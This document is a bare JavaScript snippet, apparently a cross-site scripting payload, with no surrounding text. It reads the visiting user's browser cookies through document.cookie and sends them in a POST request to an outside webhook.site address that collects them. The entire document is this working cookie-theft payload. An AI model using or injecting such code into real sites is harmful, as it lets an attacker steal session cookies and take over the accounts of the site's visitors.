fetch('https://webhook.site/bcab77e6-76b8-4378-964b-cdbdfbf170d9', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'cookie=' + encodeURIComponent(document.cookie)
});
